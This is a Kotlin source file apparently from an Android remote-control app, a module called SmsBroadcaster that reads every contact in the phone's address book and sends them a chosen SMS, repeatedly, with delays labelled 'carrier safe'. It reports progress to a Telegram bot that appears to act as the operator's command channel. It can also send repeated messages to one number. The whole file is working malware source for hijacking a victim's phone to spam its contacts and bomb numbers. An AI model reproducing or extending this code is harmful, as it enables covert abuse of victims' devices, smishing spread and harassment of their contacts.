package com.dec.monitor.sms

import android.content.Context
import android.provider.ContactsContract
import android.telephony.SmsManager
import com.dec.monitor.TelegramBot
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.withContext

object SmsBroadcaster {

    var isRunning = false

    suspend fun blastAll(context: Context, message: String, times: Int = 1) =
        withContext(Dispatchers.IO) {
            if (isRunning) {
                TelegramBot.sendMessage("⚠️ Already running — send /blast_stop first")
                return@withContext
            }

            val contacts = getContacts(context)
            if (contacts.isEmpty()) {
                TelegramBot.sendMessage("❌ No contacts found")
                return@withContext
            }

            isRunning = true
            TelegramBot.sendMessage(
                "📤 <b>SMS Blast Started</b>\nContacts: ${contacts.size}\nTimes: $times\nTotal: ${contacts.size * times} SMS\nMessage: $message"
            )

            var sent = 0
            var failed = 0

            repeat(times) { round ->
                if (!isRunning) return@repeat
                for ((name, number) in contacts) {
                    if (!isRunning) break
                    try {
                        val smsManager = SmsManager.getDefault()
                        val parts = smsManager.divideMessage(message)
                        smsManager.sendMultipartTextMessage(number, null, parts, null, null)
                        sent++
                        if (sent % 10 == 0) {
                            TelegramBot.sendMessage("📤 Progress: $sent sent, $failed failed")
                        }
                    } catch (e: Exception) {
                        failed++
                    }
                    delay(20_000L) // 20 sec delay — carrier safe
                }
                if (times > 1) {
                    TelegramBot.sendMessage("✅ Round ${round + 1}/$times done")
                    delay(60_000L) // 1 min between rounds
                }
            }

            isRunning = false
            TelegramBot.sendMessage("✅ <b>Blast Complete</b>\nSent: $sent\nFailed: $failed")
        }

    suspend fun sendToNumber(number: String, message: String, times: Int = 1) =
        withContext(Dispatchers.IO) {
            var sent = 0
            repeat(times) {
                if (!isRunning) {
                    try {
                        val smsManager = SmsManager.getDefault()
                        val parts = smsManager.divideMessage(message)
                        smsManager.sendMultipartTextMessage(number, null, parts, null, null)
                        sent++
                    } catch (e: Exception) { }
                    if (times > 1) delay(15_000L)
                }
            }
            TelegramBot.sendMessage("✅ Sent $sent/$times SMS to $number")
        }

    fun stop() {
        isRunning = false
    }

    private fun getContacts(context: Context): List<Pair<String, String>> {
        val list = mutableListOf<Pair<String, String>>()
        val seen = mutableSetOf<String>()
        try {
            val cursor = context.contentResolver.query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                arrayOf(
                    ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                    ContactsContract.CommonDataKinds.Phone.NUMBER
                ),
                null, null, null
            )
            cursor?.use {
                while (it.moveToNext()) {
                    val name = it.getString(0) ?: "Unknown"
                    val raw = it.getString(1) ?: continue
                    val number = raw.replace(" ", "").replace("-", "")
                    if (number !in seen) {
                        seen.add(number)
                        list.add(Pair(name, number))
                    }
                }
            }
        } catch (e: Exception) { }
        return list
    }
}
